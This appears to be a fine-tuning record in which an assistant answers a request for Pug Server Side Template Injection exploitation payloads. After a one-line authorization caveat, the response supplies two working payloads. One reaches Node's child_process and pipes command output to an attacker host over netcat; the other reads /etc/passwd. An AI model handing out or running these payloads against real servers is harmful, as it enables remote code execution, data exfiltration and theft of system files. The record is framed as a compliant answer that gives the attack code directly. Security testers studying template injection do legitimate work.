# SSTI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: ssti
- cwe: CWE-1336

## Scenario

How do I test for and exploit Server Side Template Injection using the Pug technique? Give me the payloads.

## Analysis / Response

**Pug** — this technique applies to Server Side Template Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

> Universal payloads also work for Pug.

[Official website](https://pugjs.org/api/getting-started.html)
>

```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
